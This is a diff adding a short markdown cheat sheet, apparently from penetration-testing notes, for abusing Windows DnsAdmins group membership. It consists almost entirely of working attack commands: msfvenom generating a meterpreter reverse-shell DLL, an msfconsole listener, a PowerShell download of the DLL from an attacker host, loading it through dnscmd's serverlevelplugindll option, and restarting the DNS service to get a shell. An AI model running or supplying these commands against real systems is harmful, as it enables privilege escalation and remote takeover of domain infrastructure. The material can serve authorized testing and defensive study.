@@ -1,1 +1,33 @@
 DNS admin
+
+# Create reverseshell.dll file with msfvenom
+
+> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4242 -f dll -o reverseshell.dll
+
+# Listen with msfconsole
+
+> msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4242; run"
+
+# In Windows Powershell
+
+## Check current user is dnsadmin
+
+> Get-ADGroupMember -Identity DnsAdmins
+
+## Download reverseshell.dll
+
+> wget "http://IP:8000/reverseshell.dll" -outfile "reverseshell.dll"
+
+## Load the DLL file
+
+> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\reverseshell.dll
+
+## Stop and Start the DNS service
+
+> sc.exe stop dns
+> sc.exe start dns
+
+# Finally get meterpreter reverseshell
+
+<img width="824" height="313" alt="image" src="https://github.com/user-attachments/assets/9abe16e6-a664-467b-bb13-a883d1c5a054" />
+
